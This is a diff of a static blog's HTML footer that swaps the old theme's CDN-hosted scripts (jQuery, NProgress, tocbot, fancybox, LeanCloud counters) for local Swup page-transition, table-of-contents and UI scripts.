+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
     </div>
-  
-  
-    <div class="statistics">
-  
-  
 
-  
-    
-      <span id="leancloud-site-pv-container" style="display: none">
-        总访问量 
-        <span id="leancloud-site-pv"></span>
-         次
-      </span>
-    
-    
-      <span id="leancloud-site-uv-container" style="display: none">
-        总访客数 
-        <span id="leancloud-site-uv"></span>
-         人
-      </span>
-    
-    
-
-  
+    <div class="image-viewer-container">
+    <img src="">
 </div>
 
-  
-  
-  
-</div>
 
-  </footer>
+    
 
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
+</main>
 
 
-<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
+    
+<script src="/js/libs/Swup.min.js"></script>
 
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
 
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
 
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
 
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
 
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
 
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-
-  
 <script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      collapseDepth   : CONFIG.toc.collapseDepth || 0,
-      scrollSmooth    : true,
-      headingsOffset  : -boardTop
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
     });
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-  });
 </script>
 
 
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-  });
-</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script defer src="/js/leancloud.js" ></script>
-
-  <script  src="/js/local-search.js" ></script>
 
 
 
 
 
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
 
 
   
+<script src="/js/libs/Typed.min.js"></script>
 
-  <noscript>
-    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
-  </noscript>
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
 </body>
 </html>
